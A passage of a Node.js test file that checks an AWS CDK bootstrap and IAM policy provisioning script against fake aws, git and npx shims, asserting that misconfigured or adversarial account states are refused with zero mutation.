// EXECUTED proofs for scripts/provision-release-bootstrap.sh (#111, round 2): the REVIEWED
// template snapshot is the authority. Fixtures are GENERATED from that snapshot through the
// script's own resolver (spot-pinned below against hand-written facts of the real template, so
// the resolver cannot drift unseen), the fake aws serves the IAM-normalized live state CFN would
// materialize, and every adversarial case mutates that state away from the template. The full
// matrix runs for BOTH tiers. Every refusal must leave ZERO mutation; no output may carry an
// account id.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { parse as parseYaml } from 'yaml';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const LAUNCHER = path.join(ROOT, 'scripts/provision.sh');
const SCRIPT = path.join(ROOT, 'scripts/provision-release-bootstrap.sh');
const RESOLVER = path.join(ROOT, 'scripts/lib/bootstrap-expected-state.py');
const SNAPSHOT = path.join(ROOT, 'infra/aws/bootstrap/cdk-bootstrap-template.yaml');
const ACCOUNT = '111122223333';
const SHA = 'f'.repeat(40);
const REGION = 'us-east-1';
const KEY_ID = '11111111-2222-3333-4444-555555555555';
const CDK_VERSION = JSON.parse(fs.readFileSync(path.join(ROOT, 'infra/aws/package-lock.json'), 'utf8'))
  .packages['node_modules/aws-cdk'].version;
const SNAPSHOT_TEXT = fs.readFileSync(SNAPSHOT, 'utf8');

// The reviewed snapshot's identity: any change to the committed template must come through THIS
// pin, which makes the change a review surface instead of a silent re-generation (r2-F1).
// r3-F4: stored with a single trailing newline so `git diff --check` stays clean.
const SNAPSHOT_SHA256 = '862af2dedb13198902e2d084587d19992edfff38224f19103ffa67de2a070447';

const ENVS = {
  dev: { qualifier: 'cbardev' },
  pilot: { qualifier: 'cbarpil' },
};
for (const [env, cfg] of Object.entries(ENVS)) {
  cfg.execArn = `arn:aws:iam::${ACCOUNT}:policy/cba-study-coach-cfn-exec-release-${env}-app`;
  // Five policies per tier (#111 r11): two boundaries + the THREE execution shards, in the
  // reviewed order. IAM caps a managed policy at 6.144 characters and the canonical execution
  // document is 10.265, so a single policy was never creatable.
  cfg.execShards = ['app', 'platform', 'guardrails'];
  cfg.execNames = cfg.execShards.map((sh) => `cba-study-coach-cfn-exec-release-${env}-${sh}`);
  cfg.legacyExecName = `cba-study-coach-cfn-exec-release-${env}`;
  cfg.policyNames = [
    `cba-study-coach-boundary-gha-deploy-${env}`,
    `cba-study-coach-boundary-runtime-${env}`,
    ...cfg.execNames,
  ];
  cfg.execArns = cfg.execNames.map((n) => `arn:aws:iam::${ACCOUNT}:policy/${n}`);
  cfg.execRole = `cdk-${cfg.qualifier}-cfn-exec-role-${ACCOUNT}-${REGION}`;
  cfg.docs = Object.fromEntries(cfg.policyNames.map((n) => {
    const shard = cfg.execShards.find((sh) => n.endsWith(`-${sh}`));
    const t = n.includes('gha-deploy') ? 'gha-deploy-boundary'
      : n.includes('runtime') ? 'runtime-boundary' : `cfn-exec-release-${shard}`;
    const rendered = fs.readFileSync(path.join(ROOT, 'infra/aws/bootstrap/policies', `${t}.template.json`), 'utf8')
      .replaceAll('ACCOUNT_ID_PLACEHOLDER', ACCOUNT)
      .replaceAll('ENVIRONMENT_PLACEHOLDER', env)
      .replaceAll('QUALIFIER_PLACEHOLDER', cfg.qualifier);
    return [n, JSON.parse(rendered)];
  }));
  // The model the script itself will resolve — fixtures and expectations share one origin, and
  // the spot-pin test below anchors that origin to hand-written facts of the real template.
  const physFile = path.join(os.tmpdir(), `cba-phys-${env}-${process.pid}.json`);
  fs.writeFileSync(physFile, JSON.stringify({ FileAssetsBucketEncryptionKey: KEY_ID }));
  cfg.execArnsCsv = cfg.execArns.join(',');
  cfg.model = JSON.parse(execFileSync('python3', [RESOLVER, SNAPSHOT, ACCOUNT, REGION, cfg.qualifier, cfg.execArnsCsv, physFile], { encoding: 'utf8' }));
  fs.rmSync(physFile, { force: true });
}

// IAM stores a bare account-id principal as the root ARN — the fake serves THAT form, so the
// validator's normalization is exercised on every run, not assumed.
function iamNormalize(node) {
  if (Array.isArray(node)) return node.map(iamNormalize);
  if (node && typeof node === 'object') {
    const out = {};
    for (const [k, v] of Object.entries(node)) {
      if (k === 'Principal' && v && typeof v === 'object' && typeof v.AWS === 'string' && v.AWS === ACCOUNT) {
        out[k] = { ...v, AWS: `arn:aws:iam::${ACCOUNT}:root` };
      } else out[k] = iamNormalize(v);
    }
    return out;
  }
  return node;
}

function liveStateFor(env) {
  // DEEP COPY, always: the adversarial cases mutate `S.live.ecr`, `S.live.kms` and role inline
  // documents in place. Handing out references to the shared per-tier model let one test corrupt
  // every later one — the read-back then diverged for reasons no test had asked for.
  const { execArns, execRole, qualifier } = ENVS[env];
  const model = structuredClone(ENVS[env].model);
  const roles = {};
  for (const [lid, r] of Object.entries(model.roles)) {
    roles[r.name] = {
      lid,
      trust: iamNormalize(r.trust),
      tags: r.tags,
      attached: r.managed,
      inline: r.inline,
      maxSession: r.maxSessionDuration,
    };
  }
  const phys = Object.fromEntries(Object.keys(model.resources).map((lid) => [
    lid, lid === 'FileAssetsBucketEncryptionKey' ? KEY_ID
      : lid === 'ContainerAssetsRepository' ? model.ecr.name
        : lid === 'StagingBucket' ? model.bucket.name : lid.toLowerCase(),
  ]));
  return {
    roles,
    resources: Object.entries(model.resources).map(([lid, t]) => ({
      LogicalResourceId: lid, ResourceType: t, ResourceStatus: 'CREATE_COMPLETE', PhysicalResourceId: phys[lid],
    })),
    bucketPolicy: model.bucket.policy,
    bucketSseKeyArn: model.bucket.sseKmsKeyArn,
    bucketLifecycle: model.bucket.lifecycle,
    ecr: model.ecr,
    kms: model.kms,
    ssmValue: model.ssm.value,
    // The COMPLETE parameter map, as CloudFormation reports it (r3-F3).
    stackParams: Object.entries(model.stackParameters).map(([k, v]) => ({ ParameterKey: k, ParameterValue: v })),
    entities: {
      [`cba-study-coach-boundary-gha-deploy-${env}|PermissionsPolicy`]: [],
      [`cba-study-coach-boundary-gha-deploy-${env}|PermissionsBoundary`]: [`cba-study-coach-gha-deploy-${env}`],
      [`cba-study-coach-boundary-runtime-${env}|PermissionsPolicy`]: [],
      [`cba-study-coach-boundary-runtime-${env}|PermissionsBoundary`]: [`cba-study-coach-${env}-api-role`],
      ...Object.fromEntries(ENVS[env].execNames.flatMap((n) => [
        [`${n}|PermissionsPolicy`, [execRole]],
        [`${n}|PermissionsBoundary`, []],
      ])),
    },
  };
}

function run(env, phase, scen = {}, mutate = null) {
  const cfg = ENVS[env];
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-relboot-'));
  const mut = path.join(dir, 'mutations');
  const npxLog = path.join(dir, 'npx-calls');
  fs.writeFileSync(mut, '');
  fs.writeFileSync(npxLog, '');
  const S = {
    env, qualifier: cfg.qualifier, execArns: cfg.execArns, execArnsCsv: cfg.execArnsCsv,
    // The legacy singular policy is ABSENT in the real account (its create failed on the IAM
    // size cap); `legacyExists` is the adversarial that proves the two sets never coexist.
    legacyName: cfg.legacyExecName, legacyExists: false, boundaryAfterCreate: null,
    stackPolicyRaw: null, emptyObs: null, lifecycleOverride: null, trustVersionOverride: null,
    stsOut: ACCOUNT, stsErr: '',
    expectedEnv: ACCOUNT, authorizedSha: SHA,
    gitHead: SHA, gitDirty: false,
    policyAbsent: [], policyErr: {}, policyDocs: {}, policyVersions: {}, policyPath: {}, createNoop: false,
    stackExists: true, stackErr: '', stackStatus: 'CREATE_COMPLETE', termProt: true,
    stackRoleArn: null, storedTemplate: null,
    resourcesNextToken: false, stackPolicy: false, createRc: 0, waitRc: 0,
    hang: null, hangWait: false, hangCreate: false, delayedChild: false, stubbornChild: false,
    probeFail: null, probeHang: null, pristineRoot: null, archiveFail: false, showFail: false,
    live: liveStateFor(env),
    docs: cfg.docs,
    ...scen,
  };
  if (mutate) mutate(S);
  const fixture = path.join(dir, 'state.json');
  fs.writeFileSync(fixture, JSON.stringify(S));

  fs.writeFileSync(path.join(dir, 'git'), `#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const S = JSON.parse(fs.readFileSync('${fixture}', 'utf8'));
const a = process.argv.slice(2);
const i = a.indexOf('-C');
const rest = i >= 0 ? a.filter((_, j) => j !== i && j !== i + 1) : a;
if (rest[0] === 'rev-parse') {
  if (S.probeFail === 'rev-parse') { process.stderr.write('fatal: not a git repository\\n'); process.exit(128); }
  process.stdout.write(S.gitHead + '\\n'); process.exit(0);
}
if (rest[0] === 'status') {
  // r5-F2: a FAILING probe writes nothing — empty output must never read as "clean".
  if (S.probeFail === 'status') { process.exit(128); }
  if (S.probeHang === 'status') { Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 30000); }
  process.stdout.write(S.gitDirty ? ' M x\\n' : ''); process.exit(0);
}
if (rest[0] === 'cat-file') { process.exit(S.probeFail === 'cat-file' ? 128 : 0); }
if (rest[0] === 'show') {
  if (S.showFail) { process.stderr.write('fatal: path does not exist in ' + rest[1] + String.fromCharCode(10)); process.exit(128); }
  const p2 = rest[1].split(':')[1];
  const src = S.pristineRoot || '${ROOT}';
  process.stdout.write(fs.readFileSync(path.join(src, p2), 'utf8'));
  process.exit(0);
}
if (rest[0] === 'archive') {
  // The authorized commit's tree, as a tar stream — exactly what the launcher extracts. The
  // SOURCE is a pristine copy of the repo files, so a tampered WORKTREE file (S.tamperedWorktree)
  // is provably not what runs.
  const src = S.pristineRoot || '${ROOT}';
  const paths = rest.slice(rest.indexOf(S.gitHead) + 1);
  if (S.archiveFail) { process.stderr.write('archive failed\\n'); process.exit(128); }
  const r = require('child_process').spawnSync('tar', ['-c', '--exclude=__pycache__', '-C', src, ...paths], { maxBuffer: 1 << 28 });
  if (r.status !== 0) { process.stderr.write('archive failed\\n'); process.exit(2); }
  // Synchronous, complete write: process.exit() would truncate a buffered pipe write.
  let off = 0;
  while (off < r.stdout.length) off += fs.writeSync(1, r.stdout, off, r.stdout.length - off);
  process.exit(0);
}
process.stderr.write('unexpected git ' + a.join(' ') + '\\n'); process.exit(254);
`, { mode: 0o755 });

  // r3-F1: the script must NEVER execute npx/cdk — any call to this shim is a loud failure,
  // and the npx-calls log doubles as the executed proof that none happened.
  fs.writeFileSync(path.join(dir, 'npx'), `#!/usr/bin/env node
const fs = require('fs');
fs.appendFileSync('${npxLog}', process.argv.slice(2).join(' ') + '\\n');
process.stderr.write('REFUSED BY TEST: npx must never run under the operator script\\n');
process.exit(254);
`, { mode: 0o755 });

  fs.writeFileSync(path.join(dir, 'aws'), `#!/usr/bin/env node
const fs = require('fs');
const S = JSON.parse(fs.readFileSync('${fixture}', 'utf8'));
const raw = process.argv.slice(2);
const a = raw.filter((x, i) => !(x.startsWith('--cli-') || (i > 0 && raw[i - 1].startsWith('--cli-'))));
const sub = a[0] + ' ' + a[1];
// r14: an observation that comes back with an EMPTY body. For every API except get-stack-policy
// that is a lost observation, never an absence.
if (S.emptyObs === sub) { process.exit(0); }
fs.appendFileSync('${path.join(dir, 'aws-calls')}', sub + '\\n');
if (S.hang === sub) { Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 30000); }
const flag = (n) => { const i = a.indexOf(n); return i >= 0 ? a[i + 1] : null; };
const mut = (x) => fs.appendFileSync('${mut}', x + '\\n');
const die = (m) => { process.stderr.write(m + '\\n'); process.exit(254); };
const out = (o) => process.stdout.write(typeof o === 'string' ? o : JSON.stringify(o));
const pname = (arn) => arn.split('/').pop();
switch (sub) {
  case 'sts get-caller-identity': if (S.stsErr) die(S.stsErr); out(S.stsOut); break;
  case 'iam get-policy': {
    const n = pname(flag('--policy-arn'));
    if (S.policyErr[n]) die(S.policyErr[n]);
    if (n === S.legacyName && !S.legacyExists) die('An error occurred (NoSuchEntity)');
    if (S.policyAbsent.includes(n)) die('An error occurred (NoSuchEntity)');
    out({ Policy: { PolicyName: n, Path: S.policyPath[n] || '/', Arn: flag('--policy-arn'), DefaultVersionId: 'v1' } });
    break;
  }
  case 'iam list-policy-versions': {
    const n = pname(flag('--policy-arn'));
    const count = S.policyVersions[n] ?? 1;
    out({ Versions: Array.from({ length: count }, (_, i) => ({ VersionId: 'v' + (i + 1), IsDefaultVersion: i === 0 })) });
    break;
  }
  case 'iam get-policy-version': {
    const n = pname(flag('--policy-arn'));
    out({ PolicyVersion: { Document: S.policyDocs[n] ?? S.docs[n] } });
    break;
  }
  case 'iam list-entities-for-policy': {
    const name = pname(flag('--policy-arn'));
    const key = name + '|' + flag('--policy-usage-filter');
    // r12-F1: a boundary use that appears only AFTER the mutation — the precondition pass is
    // clean, so only the FINAL read-back can catch it.
    const afterCreate = fs.existsSync('${mut}')
      && fs.readFileSync('${mut}', 'utf8').includes('create-stack');
    if (S.boundaryAfterCreate === name && flag('--policy-usage-filter') === 'PermissionsBoundary' && afterCreate) {
      out({ PolicyRoles: [{ RoleName: 'sneaky-role' }], PolicyUsers: [], PolicyGroups: [] });
      break;
    }
    const roles = S.entitiesOverride?.[key] ?? S.live.entities[key] ?? [];
    out({ PolicyRoles: roles.map((r) => ({ RoleName: r })), PolicyUsers: S.entitiesUsers ?? [], PolicyGroups: [] });
    break;
  }
  case 'iam create-policy': {
    const n = flag('--policy-name');
    mut('create-policy:' + n);
    if (!S.createNoop) { S.policyAbsent = S.policyAbsent.filter((x) => x !== n); fs.writeFileSync('${fixture}', JSON.stringify(S)); }
    break;
  }
  case 'iam get-role': {
    const r = S.live.roles[flag('--role-name')];
    if (!r) die('An error occurred (NoSuchEntity)');
    const trust = S.trustVersionOverride ? { ...r.trust, Version: S.trustVersionOverride } : r.trust;
    out({ Role: { Path: r.path || '/', Arn: 'arn:aws:iam::${ACCOUNT}:role/' + flag('--role-name'), AssumeRolePolicyDocument: trust, Tags: r.tags, MaxSessionDuration: r.maxSession ?? 3600, ...(r.boundary ? { PermissionsBoundary: { PermissionsBoundaryArn: r.boundary } } : {}) } });
    break;
  }
  case 'iam list-attached-role-policies': {
    const r = S.live.roles[flag('--role-name')] || {};
    out({ AttachedPolicies: (r.attached || []).map((arn) => ({ PolicyName: pname(arn), PolicyArn: arn })) });
    break;
  }
  case 'iam list-role-policies': {
    const r = S.live.roles[flag('--role-name')] || {};
    out({ PolicyNames: Object.keys(r.inline || {}) });
    break;
  }
  case 'iam get-role-policy': {
    const r = S.live.roles[flag('--role-name')] || {};
    out({ PolicyDocument: (r.inline || {})[flag('--policy-name')] ?? {} });
    break;
  }
  case 'cloudformation describe-stacks': {
    if (S.stackErr) die(S.stackErr);
    if (!S.stackExists) die('An error occurred (ValidationError): Stack does not exist');
    out({ Stacks: [{
      StackName: 'cba-release-toolkit-' + S.env, StackStatus: S.stackStatus,
      EnableTerminationProtection: S.termProt,
      ...(S.stackRoleArn ? { RoleARN: S.stackRoleArn } : {}),
      NotificationARNs: [],
      Parameters: S.live.stackParams,
      Outputs: [{ OutputKey: 'BootstrapVersion', OutputValue: S.live.ssmValue }, { OutputKey: 'BucketName', OutputValue: 'unused' }],
    }] });
    break;
  }
  case 'cloudformation get-template':
    out({ TemplateBody: S.storedTemplate ?? fs.readFileSync('${SNAPSHOT}', 'utf8') });
    break;
  case 'cloudformation list-stack-resources':
    out({ StackResourceSummaries: S.live.resources, ...(S.resourcesNextToken ? { NextToken: 'more' } : {}) });
    break;
  case 'cloudformation get-stack-policy': {
    // The real CLI serializes the documented null value as ZERO BYTES; modelling it as an
    // empty object is what let the validator crash in the live run (r14).
    if (S.stackPolicyRaw !== null && S.stackPolicyRaw !== undefined) { process.stdout.write(S.stackPolicyRaw); break; }
    if (S.stackPolicy) { out({ StackPolicyBody: '{"Statement":[]}' }); break; }
    break;   // no policy: write nothing at all
  }
  case 'cloudformation create-stack': {
    const tb = flag('--template-body');
    const bytes = tb && tb.startsWith('file://') ? fs.readFileSync(tb.slice(7)) : Buffer.from(tb ?? '');
    const digest = require('crypto').createHash('sha256').update(bytes).digest('hex');
    const pf = flag('--parameters');
    const params = pf && pf.startsWith('file://') ? fs.readFileSync(pf.slice(7), 'utf8') : '[]';
    mut('create-stack sha256=' + digest + ' params=' + JSON.stringify(JSON.parse(params)) + ' ' + a.slice(2).filter((x) => !x.startsWith('file://')).join(' '));
    // "AWS accepted, the transport failed": the stack EXISTS even though the caller sees an error.
    if (S.createAcceptedThenFailed) { S.stackExists = true; fs.writeFileSync('${fixture}', JSON.stringify(S)); process.stderr.write('connection reset\\n'); process.exit(52); }
    if (S.hangCreate) { Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 30000); }
    if (S.createRc !== 0) { process.stderr.write('create failed\\n'); process.exit(S.createRc); }
    S.stackExists = true; fs.writeFileSync('${fixture}', JSON.stringify(S));
    out({ StackId: 'arn:aws:cloudformation:us-east-1:${ACCOUNT}:stack/x/y' });
    break;
  }
  case 'cloudformation wait': {
    if (S.delayedChild || S.stubbornChild) {
      // The adversarials of r3-F2/r4-F2: a same-group child that tries to register a mutation
      // AFTER the parent is gone — the stubborn variant IGNORES SIGTERM, so only a group-wide
      // SIGKILL can stop it. The runner must leave no survivor before reconciliation.
      const body = S.stubbornChild
        ? 'process.on("SIGTERM", () => {}); setTimeout(() => require("fs").appendFileSync("${mut}", "delayed-mutation\\\\n"), 3000)'
        : 'setTimeout(() => require("fs").appendFileSync("${mut}", "delayed-mutation\\\\n"), 3000)';
      require('child_process').spawn(process.execPath, ['-e', body], { stdio: 'ignore' });
    }
    if (S.hangWait) { Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 30000); }
    if (S.waitRc !== 0) { process.stderr.write('waiter failed\\n'); process.exit(S.waitRc); }
    break;
  }
  case 's3api get-bucket-lifecycle-configuration': out({ Rules: S.lifecycleOverride ?? S.live.bucketLifecycle }); break;
  case 's3api get-bucket-acl':
    out({ Owner: { ID: 'owner-id' }, Grants: S.aclOverride ?? [{ Grantee: { ID: 'owner-id', Type: 'CanonicalUser' }, Permission: 'FULL_CONTROL' }] });
    break;
  case 'ssm get-parameter': out({ Parameter: { Name: flag('--name'), Value: S.live.ssmValue } }); break;
  case 's3api get-bucket-encryption':
    out({ ServerSideEncryptionConfiguration: { Rules: [{ ApplyServerSideEncryptionByDefault: { SSEAlgorithm: 'aws:kms', KMSMasterKeyID: S.live.bucketSseKeyArn } }] } });
    break;
  case 's3api get-bucket-versioning': out({ Status: 'Enabled' }); break;
  case 's3api get-public-access-block':
    out({ PublicAccessBlockConfiguration: { BlockPublicAcls: true, BlockPublicPolicy: true, IgnorePublicAcls: true, RestrictPublicBuckets: true } });
    break;
  case 's3api get-bucket-policy': out({ Policy: JSON.stringify(S.live.bucketPolicy) }); break;
  case 'ecr describe-repositories':
    out({ repositories: [{ repositoryName: flag('--repository-names'), imageTagMutability: S.live.ecr.imageTagMutability }] });
    break;
  case 'ecr get-lifecycle-policy': out({ lifecyclePolicyText: JSON.stringify(S.live.ecr.lifecycle) }); break;
  case 'ecr get-repository-policy': out({ policyText: JSON.stringify(S.live.ecr.policy) }); break;
  case 'kms describe-key': out({ KeyMetadata: { KeyId: flag('--key-id'), Enabled: true } }); break;
  case 'kms get-key-policy': out({ Policy: JSON.stringify(S.live.kms.keyPolicy) }); break;
  case 'kms list-aliases': out({ Aliases: S.aliasesOverride ?? [{ AliasName: S.live.kms.aliasName }] }); break;
  default: die('unexpected aws ' + a.join(' '));
}
`, { mode: 0o755 });

  // The LAUNCHER is the entrypoint under test (r5-F1/r6-F1): the runbook extracts ITS bytes from
  // the commit object store and runs that copy, which materializes the tree and runs the child.
  let outText = ''; let code = 0;
  let entry = scen.entrypoint ?? LAUNCHER;
  if (scen.extractLauncherTo) {
    // The runbook's own first step, performed for real: the launcher bytes come from the commit
    // object store (served here by the fake git), never from the worktree file.
    const shown = execFileSync(path.join(dir, 'git'), ['-C', scen.repoRoot ?? ROOT, 'show', `${S.gitHead}:scripts/provision.sh`], { encoding: 'utf8' });
    fs.writeFileSync(scen.extractLauncherTo, shown);
    entry = scen.extractLauncherTo;
  }
  try {
    // `-p` exactly as the runbook prescribes: BASH_ENV and inherited functions must not run.
    outText = execFileSync('bash', ['-p', ...(process.env.DBGX ? ['-x'] : []), entry, env, phase], {
      encoding: 'utf8',
      env: {
        PATH: `${dir}:${process.env.PATH}`,
        CBA_REPO_ROOT: scen.repoRoot ?? ROOT,
        ...(S.expectedEnv !== null ? { CBA_EXPECTED_ACCOUNT_ID: S.expectedEnv } : {}),
        ...(S.authorizedSha !== null ? { CBA_AUTHORIZED_SHA: S.authorizedSha } : {}),
        ...(scen.pythonEnv ?? {}),
        ...(scen.timeouts ?? {}),
      },
    });
  } catch (e) { outText = `${e.stdout ?? ''}${e.stderr ?? ''}`; code = e.status ?? 1; }
  const mutations = fs.readFileSync(mut, 'utf8').split('\n').filter(Boolean);
  const npxCalls = fs.readFileSync(npxLog, 'utf8').split('\n').filter(Boolean);
  const awsCalls = fs.existsSync(path.join(dir, 'aws-calls'))
    ? fs.readFileSync(path.join(dir, 'aws-calls'), 'utf8').split('\n').filter(Boolean) : [];
  if (scen.keepDir) return { out: outText, code, mutations, npxCalls, awsCalls, mutPath: mut, dir };
  fs.rmSync(dir, { recursive: true, force: true });
  return { out: outText, code, mutations, npxCalls, awsCalls };
}

// The create-stack parameters now travel as a JSON file (r11); the fake records its CONTENT.
function paramsOf(r) {
  const line = r.mutations.find((m) => m.startsWith('create-stack'));
  assert.ok(line, 'a create-stack attempt must be recorded');
  const m = line.match(/params=(\[.*?\])(?: |$)/);
  assert.ok(m, `the create-stack record must carry its parameters: ${line}`);
  return JSON.parse(m[1]);
}

// Reconciliation calls = describe-stacks AFTER the create-stack attempt (r4-F3). The existence
// probe before the mutation is a different call and must not be counted as reconciliation.
function reconcileProbes(r) {
  const i = r.awsCalls.findIndex((c) => c === 'cloudformation create-stack');
  assert.notEqual(i, -1, 'the create-stack attempt must appear in the call log');
  return r.awsCalls.slice(i + 1).filter((c) => c === 'cloudformation describe-stacks').length;
}

/* ═══════════ the reviewed snapshot and its resolver are anchored to hand-written facts ═══════════ */

test('SNAPSHOT LOCK: the committed template is the pinned digest and declares what the review saw', () => {
  assert.equal(createHash('sha256').update(SNAPSHOT_TEXT).digest('hex'), SNAPSHOT_SHA256,
    'the committed snapshot changed — regenerating it is a REVIEW event, update this pin through review');
  const tpl = parseYaml(SNAPSHOT_TEXT);
  // 14 DECLARED (CdkBoostrapPermissionsBoundaryPolicy included, condition-false by default);
  // the resolver's model carries the 13 that materialize under this project's parameterization.
  assert.equal(Object.keys(tpl.Resources).length, 14);
  assert.equal(tpl.Resources.CdkBootstrapVersion.Properties.Value, '32');
  // The real template's facts round 2 was corrected WITH (r2-F4):
  assert.ok(JSON.stringify(tpl.Resources.LookupRole.Properties.ManagedPolicyArns).includes('ReadOnlyAccess'));
  assert.ok(JSON.stringify(tpl.Resources.DeploymentActionRole.Properties.ManagedPolicyArns).includes('AWSCloudFormationReadOnlyAccess'));
  assert.equal(tpl.Resources.ContainerAssetsRepository.Properties.ImageScanningConfiguration, undefined,
    'the template does NOT enable scan-on-push — requiring it live was the r2-F4 defect');
  assert.equal(tpl.Resources.ContainerAssetsRepository.Properties.ImageTagMutability, 'IMMUTABLE');
});

test('RESOLVER PINS: the model matches hand-written facts of the real template, per tier', () => {
  for (const [env, cfg] of Object.entries(ENVS)) {
    const m = cfg.model;
    assert.deepEqual(sortedKeys(m.resources), [
      'CdkBootstrapVersion', 'CloudFormationExecutionRole', 'ContainerAssetsRepository', 'DeploymentActionRole',
      'FileAssetsBucketEncryptionKey', 'FileAssetsBucketEncryptionKeyAlias', 'FilePublishingRole',
      'FilePublishingRoleDefaultPolicy', 'ImagePublishingRole', 'ImagePublishingRoleDefaultPolicy',
      'LookupRole', 'StagingBucket', 'StagingBucketPolicy',
    ], env);
    assert.deepEqual(m.roles.LookupRole.managed, ['arn:aws:iam::aws:policy/ReadOnlyAccess'], env);
    assert.deepEqual(m.roles.DeploymentActionRole.managed, ['arn:aws:iam::aws:policy/AWSCloudFormationReadOnlyAccess'], env);
    assert.deepEqual(m.roles.CloudFormationExecutionRole.managed, [...cfg.execArns].sort(), env);
    assert.deepEqual(Object.keys(m.roles.DeploymentActionRole.inline), ['default'], env);
    assert.deepEqual(Object.keys(m.roles.LookupRole.inline), ['LookupRolePolicy'], env);
    const trust = m.roles.FilePublishingRole.trust.Statement;
    assert.equal(trust.length, 2, `${env}: exactly AssumeRole + TagSession — no trusted-accounts leak`);
    assert.deepEqual(trust.map((s) => s.Action).sort(), ['sts:AssumeRole', 'sts:TagSession'], env);
    assert.deepEqual(trust[0].Condition, { Null: { 'sts:ExternalId': 'true' } }, env);
    assert.equal(m.ssm.value, '32', env);
    assert.equal(m.bucket.name, `cdk-${cfg.qualifier}-assets-${ACCOUNT}-${REGION}`, env);
    assert.equal(m.ecr.name, `cdk-${cfg.qualifier}-container-assets-${ACCOUNT}-${REGION}`, env);
    assert.equal(m.kms.aliasName, `alias/cdk-${cfg.qualifier}-assets-key`, env);
  }
  function sortedKeys(o) { return Object.keys(o).sort(); }
});

/* ═══════════ phase: policies (full matrix, both tiers) ═══════════ */

for (const env of ['dev', 'pilot']) {
  test(`EXECUTED policies fresh (${env}): all three created in order, read back, CDK never runs`, () => {
    const r = run(env, 'policies', { policyAbsent: [...ENVS[env].policyNames] });
    assert.equal(r.code, 0, r.out);
    assert.deepEqual(r.mutations, ENVS[env].policyNames.map((n) => `create-policy:${n}`));
    assert.match(r.out, /POLICIES OK/);
    assert.deepEqual(r.npxCalls, [], 'the policies phase must never execute the CDK — not even --version');
    assert.ok(!r.out.includes(ACCOUNT), 'no account id in the output');
  });

  test(`EXECUTED policies reentrant (${env}): zero mutation, consumers audited, next-gate notice`, () => {
    const r = run(env, 'policies', {});
    assert.equal(r.code, 0, r.out);
    assert.deepEqual(r.mutations, []);
    assert.match(r.out, /reentrada, zero mutacao/);
    assert.match(r.out, /PROXIMA FASE: 'bootstrap' exige o seu proprio gate/);
  });

  test(`EXECUTED policies COMPOSITE (${env}): one absent + one divergent — ZERO mutation`, () => {
    const divergent = { Version: '2012-10-17', Statement: [{ Sid: 'W', Effect: 'Allow', Action: '*', Resource: '*' }] };
    const r = run(env, 'policies', {
      policyAbsent: [ENVS[env].policyNames[1]],
      policyDocs: { [ENVS[env].policyNames[0]]: divergent },
    });
    assert.notEqual(r.code, 0);
    assert.match(r.out, /diverges from the reviewed template/);
    assert.deepEqual(r.mutations, []);
  });

  test(`EXECUTED policies consumers (${env}, r2-F3): boundary attached as a NORMAL policy refuses`, () => {
    const [gha, runtime] = ENVS[env].policyNames;
    const other = env === 'dev' ? 'pilot' : 'dev';
    const cases = [
      [{ entitiesOverride: { [`${gha}|PermissionsPolicy`]: ['some-role'] } }, /attached as a NORMAL policy/],
      [{ entitiesOverride: { [`${runtime}|PermissionsPolicy`]: ['some-role'] } }, /attached as a NORMAL policy/],
      [{ entitiesOverride: { [`${gha}|PermissionsBoundary`]: [`cba-study-coach-gha-deploy-${other}`] } }, /outside its nominal set/],
      [{ entitiesOverride: { [`${runtime}|PermissionsBoundary`]: [`cba-study-coach-${other}-api-role`] } }, /outside its nominal set/],
      [{ entitiesOverride: { [`${runtime}|PermissionsBoundary`]: ['totally-foreign-role'] } }, /outside its nominal set/],
      [{ entitiesOverride: { [`${ENVS[env].policyNames[2]}|PermissionsBoundary`]: ['any-role'] } }, /used as a permissions boundary/],
      [{ entitiesOverride: { [`${ENVS[env].policyNames[2]}|PermissionsPolicy`]: ['intruder-role'] } }, /attached beyond the expected execution role/],
    ];
    for (const [scen, re] of cases) {
      const r = run(env, 'policies', scen);
      assert.notEqual(r.code, 0, JSON.stringify(scen));
      assert.match(r.out, re, JSON.stringify(scen));
      assert.deepEqual(r.mutations, [], 'zero mutation');
    }
  });
}

test('EXECUTED policies divergence surfaces: document, version set, identity — ZERO mutation (dev)', () => {
  const names = ENVS.dev.policyNames;
  const divergent = { Version: '2012-10-17', Statement: [] };
  const cases = [
    [{ policyDocs: { [names[2]]: divergent } }, /diverges from the reviewed template/],
    [{ policyVersions: { [names[0]]: 2 } }, /version set beyond the single reviewed default/],
    [{ policyPath: { [names[1]]: '/elsewhere/' } }, /identity \(name\/path\/arn\) diverges/],
  ];
  for (const [scen, re] of cases) {
    const r = run('dev', 'policies', scen);
    assert.notEqual(r.code, 0);
    assert.match(r.out, re);
    assert.deepEqual(r.mutations, []);
  }
});

test('EXECUTED policies hollow create: success reported, nothing materialized — never OK (dev)', () => {
  const r = run('dev', 'policies', { policyAbsent: [...ENVS.dev.policyNames], createNoop: true });
  assert.notEqual(r.code, 0);
  assert.match(r.out, /did NOT materialize/);
  assert.ok(!/POLICIES OK/.test(r.out));
});

/* ═══════════ phase: bootstrap (full matrix, both tiers) ═══════════ */

for (const env of ['dev', 'pilot']) {
  const cfg = ENVS[env];

  test(`EXECUTED bootstrap fresh (${env}, r3-F1): the EXACT snapshot bytes go to CloudFormation; npx never runs; full read-back`, () => {
    const r = run(env, 'bootstrap', { stackExists: false });
    assert.equal(r.code, 0, r.out);
    const boot = r.mutations.filter((m) => m.startsWith('create-stack'));
    assert.equal(boot.length, 1, 'exactly one create-stack — never a blind retry');
    const args = boot[0];
    // EXECUTOR BINDING: the fake computed the sha256 of the bytes it was HANDED — they must be
    // the committed snapshot's, so "an executor that ignores --template" has nowhere to hide.
    assert.ok(args.includes(`sha256=${SNAPSHOT_SHA256}`), 'the submitted template bytes are the reviewed snapshot');
    assert.match(args, new RegExp(`--stack-name cba-release-toolkit-${env}`));

    assert.ok(args.includes('--parameters'), 'os parametros sao passados explicitamente');
